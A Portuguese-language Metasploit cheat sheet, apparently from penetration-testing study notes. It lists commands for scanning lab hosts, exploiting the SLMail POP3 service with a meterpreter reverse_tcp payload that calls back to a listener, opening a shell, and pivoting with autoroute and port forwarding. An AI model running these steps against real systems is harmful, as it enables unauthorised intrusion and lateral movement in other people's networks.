# MetaSploit Framework

Ferramenta desenvolvida pela rapid7.com para auxiliar na criação e utilização de exploits.

---

Iniciando o BD para o MSF:

```bash
msfdb init
```

---

Iniciando MSF:

```bash
service postgresql start  
msfconsole
```

---

Comando de ajuda:

```msf
msf > help
```

---

Verificando a conexão com o banco de dados:

```msf
msf > db_status
```

---

Escaneamento de alvo salvando as informações no DB:

```msf
msf > db_nmap -A 172.16.1.4
```

---

Importando arquivo XML do NMAP:

```bash
nmap -v -A 172.16.1.5 -oX host5.xml  
msf > db_import host5.xml
```

---

Listagem dos hosts:

```msf
msf > hosts
```

---

Verificando vulnerabilidade nos hosts:

```msf
msf > vulns
```

---

Listagem de serviços:

```msf
msf > services
```

---

Buscando exploit:

```msf
msf > search slmail
```

---

Usando exploit:

```msf
msf > use exploit/windows/pop3/seattlelab_pass
```

---

Ver informações do exploit:

```msf
msf exploit(seattlelab_pass) > info
```

---

Setando parâmetros no exploit:

```msf
msf exploit(seattlelab_pass) > show options  
msf exploit(seattlelab_pass) > set RHOST 172.16.1.4  
msf exploit(seattlelab_pass) > show options
```

---

Verificando payloads disponíveis:

```msf
msf exploit(seattlelab_pass) > show payloads
```

---

Setando payload para ser utilizado:

```msf
msf exploit(seattlelab_pass) > set payload windows/  meterpreter/reverse_tcp  
msf exploit(seattlelab_pass) > show options  
msf exploit(seattlelab_pass) > set LHOST 172.20.0.2  
msf exploit(seattlelab_pass) > set LPORT 4444  
msf exploit(seattlelab_pass) > show options
```

---

Executando exploit:

```msf
msf exploit(seattlelab_pass) > exploit  
meterpreter > ipconfig
```

---

Verificando comandos no meterpreter:

```msf
meterpreter > help
```

---

Abrindo o shell:

```msf
meterpreter > shell
```

---

Colocando meterpreter em segundo plano:

```msf
meterpreter > background
```

---

Retomando meterpreter:

```msf
msf > session -i 4
```

---

Exibindo módulos auxiliares:

```msf
msf > show auxiliary
```

---

Utilizando um módulo auxiliar:

```msf
msf > use auxiliary/scanner/smb/smb_version  
msf > show options  
msf > set RHOSTS 172.16.1.5  
msf > run
```

---

Criando rota da rede do alvo para a nossa máquina:

```msf
meterpreter > run autoroute -s 192.168.0.0/24
```

---

Criando redirecionamento de porta do alvo para a nossa máquina:

```msf
meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.0.101
```

Output: ``[*] Local TCP relay created: 0.0.0.0:3389 >-> 192.168.0.101:3389``